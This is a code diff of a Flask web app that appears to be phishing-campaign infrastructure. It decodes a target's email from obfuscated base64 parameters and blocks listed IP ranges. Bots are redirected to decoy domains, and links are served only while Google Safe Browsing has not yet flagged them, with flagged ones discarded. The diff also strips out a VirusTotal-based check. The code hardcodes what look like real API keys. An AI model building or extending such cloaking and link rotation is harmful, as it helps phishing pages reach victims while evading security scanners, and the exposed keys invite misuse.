@@ -4,16 +4,11 @@ import random
 import base64
 import os
 import re  # For email validation
-import time  # For sleep function
-import asyncio
-import aiohttp
 
 app = Flask(__name__)
 
 # Your Google Safe Browsing API key
 API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
-# Your VirusTotal API key
-VIRUSTOTAL_API_KEY = '544adecd665fb45c6b4e80d64c5f2c3168366a72b629f9e6929d6d6863f7c833'
 # Path to the txt file with the links
 LINKS_FILE_PATH = 'links.txt'
 # Path to the raw HTML template
@@ -33,20 +28,7 @@ def check_url_safety(api_key, url):
             "clientVersion": "1.5.2"
         },
         "threatInfo": {
-            "threatTypes": [
-                "MALWARE", 
-                "SOCIAL_ENGINEERING", 
-                "UNWANTED_SOFTWARE", 
-                "PHISHING", 
-                "RANSOMWARE", 
-                "SPYWARE", 
-                "ADWARE", 
-                "DENIAL_OF_SERVICE", 
-                "SQL_INJECTION", 
-                "MITM", 
-                "ZERO_DAY_EXPLOIT", 
-                "PASSWORD_ATTACK"
-            ],
+            "threatTypes": ["MALWARE", "SOCIAL_ENGINEERING"],
             "platformTypes": ["ANY_PLATFORM"],
             "threatEntryTypes": ["URL"],
             "threatEntries": [
@@ -55,11 +37,16 @@ def check_url_safety(api_key, url):
         }
     }
     params = {'key': api_key}
-    response = requests.post(api_url, json=payload, params=params)
-    result = response.json()
+    
+    try:
+        response = requests.post(api_url, json=payload, params=params)
+        response.raise_for_status()
+        result = response.json()
+        return "matches" not in result
+    except requests.exceptions.RequestException as e:
+        print(f"Error checking URL safety: {e}")
+        return False  # Assume the URL is unsafe in case of an error
 
-    # If any matches are found, the URL is considered deceptive
-    return "matches" not in result
 
 
 
@@ -127,6 +114,24 @@ bannedIP = [
     r"^12\.148\.209\..*", r"^198\.25\..*", r"^64\.106\.213\..*"
 ]
 
+def get_first_https_link(file_path):
+    with open(file_path, 'r') as file:
+        for line in file:
+            url = line.strip()
+            if url.startswith('https'):
+                return url
+    return None
+
+def remove_link_from_file(file_path, link_to_remove):
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+    
+    with open(file_path, 'w') as file:
+        for line in lines:
+            if line.strip() != link_to_remove:
+                file.write(line)
+
+
 # Function to check if the incoming IP matches any banned IP pattern
 def is_ip_banned(ip):
     for pattern in bannedIP:
@@ -157,7 +162,7 @@ def check_links_and_serve():
     coztrexx = request.args.get('coztrexx')
 
     if not trexxcoz or not coztrexx:
-        # If parameters are missing, redirect to REDIRECT_URL
+        # If parameters are missing, redirect to a random domain
         random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
         REDIRECT_URL = 'https://' + 'www.' + random_domain
         return redirect(REDIRECT_URL)
@@ -167,7 +172,7 @@ def check_links_and_serve():
         ipv = base64.b64decode(trexxcoz).decode('utf-8')
         iav = base64.b64decode(coztrexx).decode('utf-8')
     except Exception as e:
-        # If decoding fails, redirect to REDIRECT_URL
+        # If decoding fails, redirect to a random domain
         random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
         REDIRECT_URL = 'https://' + 'www.' + random_domain
         return redirect(REDIRECT_URL)
@@ -177,7 +182,7 @@ def check_links_and_serve():
 
     # Validate the constructed email
     if not is_valid_email(vmail):
-        # If the email is not valid, redirect to REDIRECT_URL
+        # If the email is not valid, redirect to a random domain
         random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
         REDIRECT_URL = 'https://' + 'www.' + random_domain
         return redirect(REDIRECT_URL)
@@ -185,108 +190,18 @@ def check_links_and_serve():
     # If the email is valid, proceed to check the safe links
     links = get_links(LINKS_FILE_PATH)
 
-    # Loop through the links and check their safety
-    for link in links:
+    # Iterate through links and remove unsafe ones until a safe one is found
+    for link in links[:]:  # Create a shallow copy to iterate over while modifying the list
         if check_url_safety(API_KEY, link):
             # If a safe link is found, update the HTML with the Base64-encoded link and serve it
             update_html_with_av_pv_and_link(RAW_HTML_FILE_PATH, INDEX_HTML_FILE_PATH, iav, ipv, link)
             return send_file(INDEX_HTML_FILE_PATH)
         else:
-            # Remove the unsafe link and continue with the next one
-            links.remove(link)
+            # Remove the unsafe link from the file and list
+            remove_link_from_file(LINKS_FILE_PATH, link)
 
     return "No safe links found!"
 
-
-file_path = 'links.txt'
-
-async def check_url_with_virustotal(api_key, url):
-    async with aiohttp.ClientSession() as session:
-        # Submit the URL for scanning
-        scan_url = 'https://www.virustotal.com/vtapi/v2/url/scan'
-        scan_params = {'apikey': api_key, 'url': url}
-        
-        async with session.post(scan_url, data=scan_params) as scan_response:
-            scan_data = await scan_response.json()
-
-        if scan_data['response_code'] == 1:
-            scan_id = scan_data['scan_id']
-            # Wait for a few seconds to allow the scan to complete
-            await asyncio.sleep(22)
-
-            # Retrieve the scan report using the scan ID
-            report_url = 'https://www.virustotal.com/vtapi/v2/url/report'
-            report_params = {'apikey': api_key, 'resource': scan_id}
-            
-            async with session.get(report_url, params=report_params) as report_response:
-                report_data = await report_response.json()
-
-            if report_data['response_code'] == 1:
-                positives = report_data['positives']
-                total = report_data['total']
-                permalink = report_data['permalink']
-                scans = report_data.get('scans', {})
-                return positives, total, permalink, scans
-            else:
-                return None, None, None, None  # Report not ready yet
-        else:
-            return None, None, None, None  # Failed to queue URL for scanning
-
-def get_first_https_link(file_path):
-    with open(file_path, 'r') as file:
-        for line in file:
-            url = line.strip()
-            if url.startswith('https'):
-                return url
-    return None
-
-def remove_link_from_file(file_path, link_to_remove):
-    with open(file_path, 'r') as file:
-        lines = file.readlines()
-    
-    with open(file_path, 'w') as file:
-        for line in lines:
-            if line.strip() != link_to_remove:
-                file.write(line)
-
-@app.route('/check_with_VirusTotal', methods=['GET'])
-async def check_with_virustotal():
-    # Get the first https link
-    url_to_scan = get_first_https_link(file_path)
-
-    if url_to_scan:
-        print(f"Scanning URL: {url_to_scan}")
-
-        # Asynchronously check URL with VirusTotal
-        positives, total, permalink, scans = await check_url_with_virustotal(VIRUSTOTAL_API_KEY, url_to_scan)
-
-        if positives is not None:
-            print(f"URL: {url_to_scan}")
-            print(f"Positives: {positives}/{total}")
-            print(f"Detailed Report: {permalink}")
-
-            # Check the scan results for specific engines
-            trustwave_result = scans.get('Trustwave', {})
-            trustwave_detected = trustwave_result.get('detected', False)
-
-            # Flag if any other engine detects a positive result
-            other_detected = any(result.get('detected', False) for engine, result in scans.items() if engine != 'Trustwave')
-
-            # If other engines detected a positive, remove the link from the file
-            if other_detected:
-                print(f"Other engines detected a threat. Removing {url_to_scan} from the file.")
-                remove_link_from_file(file_path, url_to_scan)
-            else:
-                if trustwave_detected:
-                    print("Trustwave detected this URL as malicious, but no other engines flagged it. Keeping the link.")
-                else:
-                    print("No engines detected any issues with this URL.")
-        else:
-            print("Error retrieving scan results.")
-    else:
-        print("No https URL found in the file.")
-
-    return jsonify({"message": "Check complete."}), 200
 
 
 @app.route('/update_links', methods=['POST'])
@@ -299,29 +214,24 @@ def update_links():
     if file.filename == '':
         return jsonify({"error": "No selected file"}), 400
 
-    # Read the file and append new links to links.txt
+    # Read the file and get the new links
     new_links = file.read().decode('utf-8').strip().splitlines()
     
-    existing_links = set()
-    if os.path.exists(LINKS_FILE_PATH):
-        with open(LINKS_FILE_PATH, 'r') as links_file:
-            existing_links = set(links_file.read().splitlines())
+    # Filter out any empty lines
+    new_links = [link for link in new_links if link]
 
-    new_links_count = 0
-    with open(LINKS_FILE_PATH, 'a') as links_file:
-        for link in new_links:
-            if link and link not in existing_links:
-                links_file.write(link + '\n')
-                new_links_count += 1
+    # Overwrite the existing links with the new ones
+    with open(LINKS_FILE_PATH, 'w') as links_file:
+        links_file.write('\n'.join(new_links) + '\n')
 
-    # Count total links in links.txt
-    total_links_count = len(existing_links) + new_links_count
+    total_links_count = len(new_links)
 
     return jsonify({
         "message": "Links updated successfully!",
-        "new_links_count": new_links_count,
         "total_links_count": total_links_count
     }), 200
+
+
 
 
 if __name__ == '__main__':
